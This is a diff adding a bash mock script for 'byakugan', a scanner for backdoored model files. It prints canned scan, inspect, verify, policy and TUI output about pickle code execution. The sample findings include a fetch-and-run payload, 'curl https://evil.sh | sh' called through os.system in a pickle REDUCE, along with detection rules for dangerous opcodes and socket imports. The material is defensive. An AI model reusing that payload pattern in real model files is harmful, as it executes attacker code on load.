@@ -1,0 +1,138 @@
+#!/usr/bin/env bash
+# byakugan — static model-artifact backdoor scanner (DESIGN PREVIEW MOCK)
+#
+# This is a non-functional demo mock used to render the README recordings.
+# It prints representative output for an imagined tool; it does not parse
+# any real model files. See README.md "Status: design preview".
+
+set -euo pipefail
+
+# ---- palette -------------------------------------------------------------
+if [[ -t 1 || "${BYA_FORCE_COLOR:-0}" == "1" ]]; then
+  R=$'\e[0m'; B=$'\e[1m'; DIM=$'\e[2m'; IT=$'\e[3m'
+  RED=$'\e[38;5;203m'; GRN=$'\e[38;5;114m'; YEL=$'\e[38;5;221m'
+  BLU=$'\e[38;5;111m'; MAG=$'\e[38;5;183m'; CYN=$'\e[38;5;117m'
+  GRY=$'\e[38;5;245m'; WHT=$'\e[38;5;255m'; PNK=$'\e[38;5;211m'
+  BGRED=$'\e[48;5;52m'; BGGRN=$'\e[48;5;22m'; BGYEL=$'\e[48;5;58m'
+else
+  R=''; B=''; DIM=''; IT=''; RED=''; GRN=''; YEL=''; BLU=''; MAG=''
+  CYN=''; GRY=''; WHT=''; PNK=''; BGRED=''; BGGRN=''; BGYEL=''
+fi
+
+EYE="◉"
+step() { printf "  ${GRY}%s${R} %s\n" "$1" "$2"; sleep "${3:-0.18}"; }
+rule() { printf "${GRY}%s${R}\n" "────────────────────────────────────────────────────────────────────────────"; }
+
+banner() {
+  printf "${MAG}${B}  ⟁ byakugan${R}  ${DIM}白眼${R}  ${GRY}· static model-artifact backdoor scanner${R}  ${DIM}v0.1.0-preview${R}\n"
+}
+
+# ---- scan ----------------------------------------------------------------
+cmd_scan() {
+  local target="${1:-model.pt}"
+  banner
+  printf "\n${WHT}Opening the eye on${R} ${CYN}%s${R}\n\n" "$target"
+  step "${EYE}" "detecting container format ........ ${B}PyTorch zip (pickle protocol 2)${R}" 0.25
+  step "${EYE}" "unpacking archive ................. ${DIM}data.pkl  archive/data/*  byteorder${R}" 0.22
+  step "${EYE}" "disassembling pickle VM ........... ${B}1,284 opcodes${R}" 0.30
+  step "${EYE}" "walking the chakra network ........ ${DIM}resolving GLOBAL / REDUCE / STACK_GLOBAL${R}" 0.28
+  step "${EYE}" "matching tenketsu rules ........... ${DIM}142 rules · armur/pickle, armur/keras${R}" 0.26
+  printf "\n"
+  rule
+  printf "${B}  TENKETSU${R}   ${GRY}dangerous points found in the artifact${R}\n"
+  rule
+  printf "  ${RED}${B}●${R} ${RED}DANGEROUS${R}  ${WHT}arbitrary-code-execution on load${R}         ${GRY}armur/pickle/reduce-os-system${R}\n"
+  printf "     ${GRY}off 0x0a41${R}  ${DIM}pickle${R}  ${WHT}GLOBAL      posix exec${R}\n"
+  printf "     ${GRY}off 0x0a5c${R}  ${DIM}pickle${R}  ${WHT}REDUCE${R}      ${IT}→ os.system(\"curl evil.sh | sh\")${R}\n"
+  printf "     ${DIM}└─ torch.load(...) will run this the instant the file is opened${R}\n\n"
+  printf "  ${YEL}${B}●${R} ${YEL}WARN${R}       ${WHT}suspicious import reachable${R}              ${GRY}armur/pickle/import-socket${R}\n"
+  printf "     ${GRY}off 0x118f${R}  ${DIM}pickle${R}  ${WHT}STACK_GLOBAL${R} ${IT}socket.socket${R}\n\n"
+  printf "  ${YEL}${B}●${R} ${YEL}WARN${R}       ${WHT}opaque embedded blob${R}                     ${GRY}armur/blob/high-entropy${R}\n"
+  printf "     ${GRY}off 0x2200${R}  ${DIM}archive${R} ${WHT}87 KiB${R} ${IT}entropy 7.98 — not a tensor${R}\n"
+  rule
+  printf "  ${GRY}scanned${R} ${WHT}1 file${R}  ${GRY}·${R} ${WHT}1,284 opcodes${R}  ${GRY}·${R} ${WHT}142 rules${R}  ${GRY}·${R} ${WHT}38ms${R}\n"
+  printf "\n"
+  printf "  ${BGRED}${WHT}${B}  VERDICT: DANGEROUS  ${R}  ${RED}do not load — this artifact executes code on torch.load${R}\n"
+  printf "  ${DIM}fix: re-export as .safetensors · quarantined · exit code 3${R}\n\n"
+}
+
+# ---- inspect -------------------------------------------------------------
+cmd_inspect() {
+  local target="${1:-model.pt}"
+  banner
+  printf "\n${WHT}The chakra network of${R} ${CYN}%s${R} ${GRY}— pickle opcode stream${R}\n\n" "$target"
+  printf "  ${GRY}offset   opcode          operand${R}\n"
+  printf "  ${GRY}──────   ─────────────   ─────────────────────────────────────────────${R}\n"
+  printf "  ${DIM}0x0a30   PROTO           2${R}\n"
+  printf "  ${DIM}0x0a32   FRAME           4184${R}\n"
+  printf "  ${DIM}0x0a3b   EMPTY_DICT${R}\n"
+  printf "  ${RED}${B}0x0a41   GLOBAL          posix  system          ◀ tenketsu${R}\n"
+  printf "  ${DIM}0x0a52   MARK${R}\n"
+  printf "  ${RED}0x0a53   UNICODE         'curl https://evil.sh | sh'${R}\n"
+  printf "  ${DIM}0x0a5a   TUPLE1${R}\n"
+  printf "  ${RED}${B}0x0a5c   REDUCE                          ◀ executes os.system(...)  ${BGRED}${WHT} ACE ${R}\n"
+  printf "  ${DIM}0x0a5e   BINPUT          1${R}\n"
+  printf "  ${DIM}0x0a60   ... 1,180 opcodes elided (state_dict tensors) ...${R}\n"
+  printf "  ${YEL}0x118f   STACK_GLOBAL    socket  socket          ◀ suspicious${R}\n"
+  printf "  ${DIM}0x11a4   STOP${R}\n"
+  printf "\n"
+  printf "  ${WHT}${B}Reading${R}  ${GRY}the REDUCE at 0x0a5c calls the callable pushed by the GLOBAL at${R}\n"
+  printf "  ${GRY}0x0a41 (${R}${RED}posix.system${R}${GRY}) with the string at 0x0a53. torch.load / pickle.load${R}\n"
+  printf "  ${GRY}execute this during deserialization — before any weights are read.${R}\n\n"
+  printf "  ${CYN}remediation${R}  ${WHT}re-serialize weights as safetensors; never unpickle untrusted .pt${R}\n\n"
+}
+
+# ---- verify (safe path) --------------------------------------------------
+cmd_verify() {
+  local target="${1:-model.safetensors}"
+  banner
+  printf "\n${WHT}Verifying${R} ${CYN}%s${R}\n\n" "$target"
+  step "${EYE}" "format .......... ${GRN}safetensors${R} ${DIM}(safe-by-design: pure tensors, no code)${R}" 0.22
+  step "${EYE}" "header .......... ${DIM}valid JSON · 291 tensors · 7.24 GB · fp16${R}" 0.22
+  step "${EYE}" "code paths ...... ${GRN}none — format cannot carry executable opcodes${R}" 0.22
+  step "${EYE}" "metadata ........ ${DIM}no trust_remote_code hook referenced${R}" 0.2
+  printf "\n"
+  printf "  ${BGGRN}${WHT}${B}  VERDICT: SAFE  ${R}  ${GRN}no load-time code paths · exit code 0${R}\n\n"
+}
+
+# ---- policy --------------------------------------------------------------
+cmd_policy() {
+  banner
+  printf "\n${WHT}Active policy${R} ${DIM}(.byakugan.yml)${R}\n\n"
+  printf "  ${GRN}✔${R} ${WHT}require-format${R}        ${GRY}safetensors${R}        ${DIM}unsafe-by-design formats blocked${R}\n"
+  printf "  ${GRN}✔${R} ${WHT}forbid${R}                ${GRY}trust_remote_code${R}  ${DIM}auto-exec hooks rejected${R}\n"
+  printf "  ${GRN}✔${R} ${WHT}forbid-opcodes${R}        ${GRY}REDUCE GLOBAL INST${R} ${DIM}on untrusted sources${R}\n"
+  printf "  ${GRN}✔${R} ${WHT}fail-on${R}               ${GRY}dangerous${R}          ${DIM}CI gate threshold${R}\n"
+  printf "  ${YEL}!${R} ${WHT}allow-pickle-from${R}     ${GRY}./trusted/*${R}        ${DIM}1 exception path${R}\n\n"
+  printf "  ${GRY}policy applied to every ${R}${WHT}scan${R}${GRY} and ${R}${WHT}verify${R}${GRY}; violations surface as findings.${R}\n\n"
+}
+
+# ---- tui -----------------------------------------------------------------
+cmd_tui() {
+  clear
+  local TL="╭" TR="╮" BL="╰" BR="╯" H="─" V="│"
+  printf "${MAG}${B}⟁ byakugan${R} ${DIM}白眼${R} ${GRY}· models/ ${R}${DIM}(14 artifacts)${R}                               ${DIM}? help  / search  q quit${R}\n"
+  printf "${GRY}╭──────────────────────────────┬───────────────────────────────────────────────╮${R}\n"
+  printf "${GRY}│${R} ${B}ARTIFACTS${R}                    ${GRY}│${R} ${B}CHAKRA NETWORK${R} ${DIM}· resnet_backdoor.pt${R}            ${GRY}│${R}\n"
+  printf "${GRY}├──────────────────────────────┤${R}                                               ${GRY}│${R}\n"
+  printf "${GRY}│${R} ${RED}● resnet_backdoor.pt${R}  ${RED}DANGER${R}  ${GRY}│${R} ${GRY}0x0a41${R} ${RED}GLOBAL  posix.system${R}   ${RED}◀ tenketsu${R}      ${GRY}│${R}\n"
+  printf "${GRY}│${R} ${YEL}● clip_vit.bin${R}        ${YEL}WARN${R}  ${GRY}│${R} ${GRY}0x0a5c${R} ${RED}REDUCE${R} ${BGRED}${WHT} ACE ${R} ${DIM}os.system(...)${R}          ${GRY}│${R}\n"
+  printf "${GRY}│${R} ${GRN}● llama3-q4.gguf${R}      ${GRN}SAFE${R}  ${GRY}│${R} ${GRY}0x118f${R} ${YEL}STACK_GLOBAL socket${R}  ${YEL}◀ suspicious${R}   ${GRY}│${R}\n"
+  printf "${GRY}│${R} ${GRN}● sd_unet.safetensors${R} ${GRN}SAFE${R}  ${GRY}│${R} ${DIM}0x2200 BLOB   87 KiB  entropy 7.98${R}         ${GRY}│${R}\n"
+  printf "${GRY}│${R} ${GRN}● tokenizer.model${R}     ${GRN}SAFE${R}  ${GRY}│${R} ${DIM}──────────────────────────────────────────${R}  ${GRY}│${R}\n"
+  printf "${GRY}│${R} ${DIM}  … 9 more${R}                ${GRY}│${R} ${WHT}▸ torch.load runs os.system before weights load${R}  ${GRY}│${R}\n"
+  printf "${GRY}│${R}                              ${GRY}│${R} ${CYN}▸ fix: re-export as .safetensors${R}              ${GRY}│${R}\n"
+  printf "${GRY}├──────────────────────────────┴───────────────────────────────────────────────┤${R}\n"
+  printf "${GRY}│${R} ${RED}1 dangerous${R}  ${YEL}2 warn${R}  ${GRN}11 safe${R}   ${DIM}·${R}  ${WHT}enter${R} ${GRY}inspect${R}  ${WHT}s${R} ${GRY}sarif${R}  ${WHT}p${R} ${GRY}policy${R}  ${WHT}a${R} ${GRY}quarantine${R}  ${GRY}│${R}\n"
+  printf "${GRY}╰───────────────────────────────────────────────────────────────────────────────╯${R}\n"
+  printf "\n"
+}
+
+case "${1:-scan}" in
+  scan)    shift || true; cmd_scan "${1:-model.pt}";;
+  inspect) shift || true; cmd_inspect "${1:-model.pt}";;
+  verify)  shift || true; cmd_verify "${1:-model.safetensors}";;
+  policy)  cmd_policy;;
+  tui)     cmd_tui;;
+  *)       cmd_scan "${1:-model.pt}";;
+esac
